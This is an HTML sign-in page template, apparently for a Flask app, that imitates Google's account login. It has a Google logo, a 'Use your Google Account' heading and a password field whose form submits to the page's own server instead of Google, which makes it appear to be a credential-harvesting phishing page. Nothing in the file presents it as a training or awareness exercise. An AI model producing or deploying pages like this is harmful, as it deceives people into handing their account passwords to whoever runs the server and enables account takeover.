<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google Account</title>
    <link rel="stylesheet" type="text/css" href="static/style.css">
</head>
<body>
    <div class="login-container">
        <!-- Image Area in Top-Left Corner -->
        <div class="image-area">
            <img src="{{ url_for('static', filename='google.png') }}" alt="Google Logo">
        </div>

        <!-- Sign-in Text Displayed Below the Image -->
        <div class="text-area">
            <h1>Sign In</h1>
            <h5>Use your Google Account</h5>
        </div>

        <!-- Input Area with Button and Show Password Feature -->
        <form method="POST">
            <div class="input-area-wrapper">
                <!-- Password Input Field -->
                <input type="password" id="password" name="password" placeholder="Account password" required>

                <!-- Show Password Feature -->
                <div class="show-password-container">
                    <input type="checkbox" id="show-password" onclick="togglePassword()">
                    <label for="show-password"><h4>Show Password</h4></label>
                </div>

                <!-- Submit Button -->
                <button type="submit">Sign In</button>
            </div>
        </form>
    </div>

    <!-- JavaScript to Toggle Password Visibility -->
    <script>
        function togglePassword() {
            const passwordField = document.getElementById('password');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }
    </script>
</body>
</html>
